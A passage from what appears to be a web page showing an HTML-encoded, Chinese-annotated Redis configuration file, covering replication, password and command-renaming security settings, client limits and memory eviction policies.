&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x5FC5;&#x987B;&#x5236;&#x5B9A;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x800C;&#x4E0D;&#x662F;&#x6587;&#x4EF6;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x201C;./&#x201D;&#xFF0C;&#x6700;&#x597D;&#x6539;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x4E3A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4E3A;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;redis&#x5728;&#x54EA;&#x91CC;&#x542F;&#x52A8;&#xFF0C;dump.rdb&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x5728;&#x542F;&#x52A8;&#x7684;&#x76EE;&#x5F55;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x4E9B;&#x4EBA;&#x91CD;&#x542F;redis&#x540E;key&#x503C;&#x6D88;&#x5931;&#x7684;&#x539F;&#x56E0;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">dir ./</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################# &#x4E3B;&#x4ECE;&#x590D;&#x5236; #################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4E3B;&#x4ECE;&#x590D;&#x5236;. &#x8BBE;&#x7F6E;&#x8BE5;&#x6570;&#x636E;&#x5E93;&#x4E3A;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;. </span></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x5F53;&#x672C;&#x673A;&#x4E3A;slav&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x8BBE;&#x7F6E;master&#x670D;&#x52A1;&#x7684;IP&#x5730;&#x5740;&#x53CA;&#x7AEF;&#x53E3;&#xFF0C;&#x5728;Redis&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x81EA;&#x52A8;&#x4ECE;master&#x8FDB;&#x884C;&#x6570;&#x636E;&#x540C;&#x6B65;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;master&#x670D;&#x52A1;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#x4FDD;&#x62A4;&#x65F6;(&#x7528;requirepass&#x5236;&#x5B9A;&#x7684;&#x5BC6;&#x7801;)</span></span><br><span class=\"line\"><span class=\"comment\"># slav&#x670D;&#x52A1;&#x8FDE;&#x63A5;master&#x7684;&#x5BC6;&#x7801;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\">masterauth &lt;master-password&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x4ECE;&#x5E93;&#x540C;&#x4E3B;&#x673A;&#x5931;&#x53BB;&#x8FDE;&#x63A5;&#x6216;&#x8005;&#x590D;&#x5236;&#x6B63;&#x5728;&#x8FDB;&#x884C;&#xFF0C;&#x4ECE;&#x673A;&#x5E93;&#x6709;&#x4E24;&#x79CD;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1) &#x5982;&#x679C;slave-serve-stale-data&#x8BBE;&#x7F6E;&#x4E3A;yes(&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;)&#xFF0C;&#x4ECE;&#x5E93;&#x4F1A;&#x7EE7;&#x7EED;&#x76F8;&#x5E94;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># 2) &#x5982;&#x679C;slave-serve-stale-data&#x662F;&#x6307;&#x4E3A;no&#xFF0C;&#x51FA;&#x53BB;INFO&#x548C;SLAVOF&#x547D;&#x4EE4;&#x4E4B;&#x5916;&#x7684;&#x4EFB;&#x4F55;&#x8BF7;&#x6C42;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x9519;&#x8BEF;&quot;SYNC with master in progress&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">slave-serve-stale-data yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#x4E00;&#x4E2A; slave &#x5B9E;&#x4F53;&#x662F;&#x5426;&#x63A5;&#x53D7;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x901A;&#x8FC7;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x6765;&#x5B58;&#x50A8;&#x4E00;&#x4E9B;&#x77ED;&#x6682;&#x7684;&#x6570;&#x636E;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A; slave &#x5B9E;&#x4F8B;&#x6765;&#x8BF4;&#x53EF;&#x80FD;&#x662F;&#x6709;&#x7528;&#x7684;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x56E0;&#x4E3A;&#x76F8;&#x5BF9;&#x4ECE; master &#x91CD;&#x65B0;&#x540C;&#x6B65;&#x6570;&#x800C;&#x8A00;&#xFF0C;&#x636E;&#x6570;&#x636E;&#x5199;&#x5165;&#x5230; slave &#x4F1A;&#x66F4;&#x5BB9;&#x6613;&#x88AB;&#x5220;&#x9664;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x56E0;&#x4E3A;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#x7684;&#x914D;&#x7F6E;&#x5199;&#x5165;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4ECE; redis 2.6 &#x7248;&#x8D77;&#xFF0C;&#x9ED8;&#x8BA4; slaves &#x90FD;&#x662F;&#x53EA;&#x8BFB;&#x7684;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Note: read only slaves are not designed to be exposed to untrusted clients</span></span><br><span class=\"line\"><span class=\"comment\"># on the internet. It&apos;s just a protection layer against misuse of the instance.</span></span><br><span class=\"line\"><span class=\"comment\"># Still a read only slave exports by default all the administrative commands</span></span><br><span class=\"line\"><span class=\"comment\"># such as CONFIG, DEBUG, and so forth. To a limited extent you can improve</span></span><br><span class=\"line\"><span class=\"comment\"># security of read only slaves using &apos;rename-command&apos; to shadow all the</span></span><br><span class=\"line\"><span class=\"comment\"># administrative / dangerous commands.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#xFF1A;&#x53EA;&#x8BFB;&#x7684; slaves &#x6CA1;&#x6709;&#x88AB;&#x8BBE;&#x8BA1;&#x6210;&#x5728; internet &#x4E0A;&#x66B4;&#x9732;&#x7ED9;&#x4E0D;&#x53D7;&#x4FE1;&#x4EFB;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5B83;&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x9488;&#x5BF9;&#x8BEF;&#x7528;&#x5B9E;&#x4F8B;&#x7684;&#x4E00;&#x4E2A;&#x4FDD;&#x62A4;&#x5C42;&#x3002;</span></span><br><span class=\"line\">slave-read-only yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Slaves &#x5728;&#x4E00;&#x4E2A;&#x9884;&#x5B9A;&#x4E49;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#x53D1;&#x9001; ping &#x547D;&#x4EE4;&#x5230; server &#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x6539;&#x53D8;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A; 10 &#x79D2;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># repl-ping-slave-period 10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The following option sets the replication timeout for:</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x671F;&#x65F6;&#x95F4;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1) Bulk transfer I/O during SYNC, from the point of view of slave.</span></span><br><span class=\"line\"><span class=\"comment\"># 2) Master timeout from the point of view of slaves (data, pings).</span></span><br><span class=\"line\"><span class=\"comment\"># 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># It is important to make sure that this value is greater than the value</span></span><br><span class=\"line\"><span class=\"comment\"># specified for repl-ping-slave-period otherwise a timeout will be detected</span></span><br><span class=\"line\"><span class=\"comment\"># every time there is low traffic between the master and the slave.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x503C;&#x4E00;&#x5B9A;&#x8981;&#x6BD4; repl-ping-slave-period &#x5927;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># repl-timeout 60</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Disable TCP_NODELAY on the slave socket after SYNC?</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and</span></span><br><span class=\"line\"><span class=\"comment\"># less bandwidth to send data to slaves. But this can add a delay for</span></span><br><span class=\"line\"><span class=\"comment\"># the data to appear on the slave side, up to 40 milliseconds with</span></span><br><span class=\"line\"><span class=\"comment\"># Linux kernels using a default configuration.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># If you select &quot;no&quot; the delay for data to appear on the slave side will</span></span><br><span class=\"line\"><span class=\"comment\"># be reduced but more bandwidth will be used for replication.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default we optimize for low latency, but in very high traffic conditions</span></span><br><span class=\"line\"><span class=\"comment\"># or when the master and slaves are many hops away, turning this to &quot;yes&quot; may</span></span><br><span class=\"line\"><span class=\"comment\"># be a good idea.</span></span><br><span class=\"line\">repl-disable-tcp-nodelay no</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x5BB9;&#x91CF;&#x5927;&#x5C0F;&#x3002;&#x8FD9;&#x4E2A; backlog &#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5728; slaves &#x88AB;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x65F6;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5B58;&#x653E; slave &#x6570;&#x636E;&#x7684; buffer&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x4E00;&#x4E2A; slave &#x60F3;&#x8981;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#xFF0C;&#x901A;&#x5E38;&#x4E0D;&#x5E0C;&#x671B;&#x5168;&#x90E8;&#x91CD;&#x65B0;&#x540C;&#x6B65;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x53EA;&#x662F;&#x90E8;&#x5206;&#x540C;&#x6B65;&#x5C31;&#x591F;&#x4E86;&#xFF0C;&#x4EC5;&#x4EC5;&#x4F20;&#x9012; slave &#x5728;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x65F6;&#x4E22;&#x5931;&#x7684;&#x8FD9;&#x90E8;&#x5206;&#x6570;&#x636E;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The biggest the replication backlog, the longer the time the slave can be</span></span><br><span class=\"line\"><span class=\"comment\"># disconnected and later be able to perform a partial resynchronization.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x503C;&#x8D8A;&#x5927;&#xFF0C;salve &#x53EF;&#x4EE5;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x8D8A;&#x957F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The backlog is only allocated once there is at least a slave connected.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># repl-backlog-size 1mb</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># After a master has no longer connected slaves for some time, the backlog</span></span><br><span class=\"line\"><span class=\"comment\"># will be freed. The following option configures the amount of seconds that</span></span><br><span class=\"line\"><span class=\"comment\"># need to elapse, starting from the time the last slave disconnected, for</span></span><br><span class=\"line\"><span class=\"comment\"># the backlog buffer to be freed.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x67D0;&#x4E9B;&#x65F6;&#x5019;&#xFF0C;master &#x4E0D;&#x518D;&#x8FDE;&#x63A5; slaves&#xFF0C;backlog &#x5C06;&#x88AB;&#x91CA;&#x653E;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A value of 0 means to never release the backlog.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A; 0 &#xFF0C;&#x610F;&#x5473;&#x7740;&#x7EDD;&#x4E0D;&#x91CA;&#x653E; backlog &#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># repl-backlog-ttl 3600</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5F53; master &#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;Redis Sentinel &#x4F1A;&#x4ECE; slaves &#x4E2D;&#x9009;&#x51FA;&#x4E00;&#x4E2A;&#x65B0;&#x7684; master&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x503C;&#x8D8A;&#x5C0F;&#xFF0C;&#x5C31;&#x8D8A;&#x4F1A;&#x88AB;&#x4F18;&#x5148;&#x9009;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x662F; 0 &#xFF0C; &#x90A3;&#x662F;&#x610F;&#x5473;&#x7740;&#x8FD9;&#x4E2A; slave &#x4E0D;&#x53EF;&#x80FD;&#x88AB;&#x9009;&#x4E2D;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x4F18;&#x5148;&#x7EA7;&#x4E3A; 100&#x3002;</span></span><br><span class=\"line\">slave-priority 100</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># It is possible for a master to stop accepting writes if there are less than</span></span><br><span class=\"line\"><span class=\"comment\"># N slaves connected, having a lag less or equal than M seconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The N slaves need to be in &quot;online&quot; state.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The lag in seconds, that must be &lt;= the specified value, is calculated from</span></span><br><span class=\"line\"><span class=\"comment\"># the last ping received from the slave, that is usually sent every second.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># This option does not GUARANTEES that N replicas will accept the write, but</span></span><br><span class=\"line\"><span class=\"comment\"># will limit the window of exposure for lost writes in case not enough slaves</span></span><br><span class=\"line\"><span class=\"comment\"># are available, to the specified number of seconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For example to require at least 3 slaves with a lag &lt;= 10 seconds use:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># min-slaves-to-write 3</span></span><br><span class=\"line\"><span class=\"comment\"># min-slaves-max-lag 10</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Setting one or the other to 0 disables the feature.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default min-slaves-to-write is set to 0 (feature disabled) and</span></span><br><span class=\"line\"><span class=\"comment\"># min-slaves-max-lag is set to 10.   </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################## &#x5B89;&#x5168; ###################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x540E;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x5176;&#x4ED6;&#x6307;&#x5B9A;&#x524D;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x5BC6;&#x7801;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8B66;&#x544A;&#xFF1A;&#x56E0;&#x4E3A;redis&#x901F;&#x5EA6;&#x76F8;&#x5F53;&#x5FEB;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x4E00;&#x53F0;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0B;&#xFF0C;&#x4E00;&#x4E2A;&#x5916;&#x90E8;&#x7684;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x79D2;&#x949F;&#x8FDB;&#x884C;150K&#x6B21;&#x7684;&#x5BC6;&#x7801;&#x5C1D;&#x8BD5;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4F60;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x5F3A;&#x5927;&#x7684;&#x5BC6;&#x7801;&#x6765;&#x9632;&#x6B62;&#x66B4;&#x529B;&#x7834;&#x89E3;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">requirepass foobared</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x547D;&#x4EE4;&#x91CD;&#x547D;&#x540D;.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x4E00;&#x4E2A;&#x5171;&#x4EAB;&#x73AF;&#x5883;&#x4E0B;&#x53EF;&#x4EE5;&#x91CD;&#x547D;&#x540D;&#x76F8;&#x5BF9;&#x5371;&#x9669;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x6BD4;&#x5982;&#x628A;CONFIG&#x91CD;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x4E0D;&#x5BB9;&#x6613;&#x731C;&#x6D4B;&#x7684;&#x5B57;&#x7B26;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E3E;&#x4F8B;:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x60F3;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#xFF0C;&#x76F4;&#x63A5;&#x628A;&#x5B83;&#x91CD;&#x547D;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x7A7A;&#x5B57;&#x7B26;&quot;&quot;&#x5373;&#x53EF;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># rename-command CONFIG &quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Please note that changing the name of commands that are logged into the</span></span><br><span class=\"line\"><span class=\"comment\"># AOF file or transmitted to slaves may cause problems.</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################### &#x7EA6;&#x675F; ####################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x6700;&#x5927;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#xFF0C;&#x9ED8;&#x8BA4;&#x65E0;&#x9650;&#x5236;&#xFF0C;Redis&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x6253;&#x5F00;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#x4E3A;Redis&#x8FDB;&#x7A0B;&#x53EF;&#x4EE5;&#x6253;&#x5F00;&#x7684;&#x6700;&#x5927;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6570;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x8BBE;&#x7F6E; maxclients 0&#xFF0C;&#x8868;&#x793A;&#x4E0D;&#x4F5C;&#x9650;&#x5236;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#x5230;&#x8FBE;&#x9650;&#x5236;&#x65F6;&#xFF0C;Redis&#x4F1A;&#x5173;&#x95ED;&#x65B0;&#x7684;&#x8FDE;&#x63A5;&#x5E76;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x8FD4;&#x56DE;max number of clients reached&#x9519;&#x8BEF;&#x4FE1;&#x606F;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># maxclients 128</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A;Redis&#x6700;&#x5927;&#x5185;&#x5B58;&#x9650;&#x5236;&#xFF0C;Redis&#x5728;&#x542F;&#x52A8;&#x65F6;&#x4F1A;&#x628A;&#x6570;&#x636E;&#x52A0;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x5185;&#x5B58;&#x540E;&#xFF0C;Redis&#x4F1A;&#x5148;&#x5C1D;&#x8BD5;&#x6E05;&#x9664;&#x5DF2;&#x5230;&#x671F;&#x6216;&#x5373;&#x5C06;&#x5230;&#x671F;&#x7684;Key</span></span><br><span class=\"line\"><span class=\"comment\"># Redis&#x540C;&#x65F6;&#x4E5F;&#x4F1A;&#x79FB;&#x9664;&#x7A7A;&#x7684;list&#x5BF9;&#x8C61;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x6B64;&#x65B9;&#x6CD5;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x4ECD;&#x7136;&#x5230;&#x8FBE;&#x6700;&#x5927;&#x5185;&#x5B58;&#x8BBE;&#x7F6E;&#xFF0C;&#x5C06;&#x65E0;&#x6CD5;&#x518D;&#x8FDB;&#x884C;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#xFF1A;Redis&#x65B0;&#x7684;vm&#x673A;&#x5236;&#xFF0C;&#x4F1A;&#x628A;Key&#x5B58;&#x653E;&#x5185;&#x5B58;&#xFF0C;Value&#x4F1A;&#x5B58;&#x653E;&#x5728;swap&#x533A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># maxmemory&#x7684;&#x8BBE;&#x7F6E;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#x4E8E;&#x628A;redis&#x5F53;&#x4F5C;&#x4E8E;&#x7C7B;&#x4F3C;memcached&#x7684;&#x7F13;&#x5B58;&#x6765;&#x4F7F;&#x7528;&#xFF0C;&#x800C;&#x4E0D;&#x9002;&#x5408;&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x771F;&#x5B9E;&#x7684;DB&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x628A;Redis&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x771F;&#x5B9E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x5C06;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5927;&#x7684;&#x5F00;&#x9500;</span></span><br><span class=\"line\"><span class=\"comment\"># maxmemory &lt;bytes&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x5185;&#x5B58;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x503C;&#x7684;&#x65F6;&#x5019;Redis&#x4F1A;&#x9009;&#x62E9;&#x5220;&#x9664;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#xFF1F;&#x6709;&#x4E94;&#x79CD;&#x65B9;&#x5F0F;&#x53EF;&#x4F9B;&#x9009;&#x62E9;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># volatile-lru -&gt; &#x5229;&#x7528;LRU&#x7B97;&#x6CD5;&#x79FB;&#x9664;&#x8BBE;&#x7F6E;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;key (LRU:&#x6700;&#x8FD1;&#x4F7F;&#x7528; Least Recently Used )</span></span><br><span class=\"line\"><span class=\"comment\"># allkeys-lru -&gt; &#x5229;&#x7528;LRU&#x7B97;&#x6CD5;&#x79FB;&#x9664;&#x4EFB;&#x4F55;key</span></span><br><span class=\"line\"><span class=\"comment\"># volatile-random -&gt; &#x79FB;&#x9664;&#x8BBE;&#x7F6E;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;&#x968F;&#x673A;key</span></span><br><span class=\"line\"><span class=\"comment\"># allkeys-&gt;random -&gt; remove a random key, any key</span></span><br><span class=\"line\"><span class=\"comment\"># volatile-ttl -&gt; &#x79FB;&#x9664;&#x5373;&#x5C06;&#x8FC7;&#x671F;&#x7684;key(minor TTL)</span></span><br><span class=\"line\"><span class=\"comment\"># noeviction -&gt; &#x4E0D;&#x79FB;&#x9664;&#x4EFB;&#x4F55;&#x53EF;&#x4EE5;&#xFF0C;&#x53EA;&#x662F;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5199;&#x9519;&#x8BEF;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#xFF1A;&#x5BF9;&#x4E8E;&#x4E0A;&#x9762;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5408;&#x9002;&#x7684;key&#x53EF;&#x4EE5;&#x79FB;&#x9664;&#xFF0C;&#x5F53;&#x5199;&#x7684;&#x65F6;&#x5019;Redis&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#       &#x5199;&#x547D;&#x4EE4;&#x5305;&#x62EC;: set setnx setex append</span></span><br><span class=\"line\"><span class=\"comment\">#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd</span></span><br><span class=\"line\"><span class=\"comment\">#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby</span></span><br><span class=\"line\"><span class=\"comment\">#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby</span></span><br><span class=\"line\"><span class=\"comment\">#       getset mset msetnx exec sort</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x662F;:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># maxmemory-policy 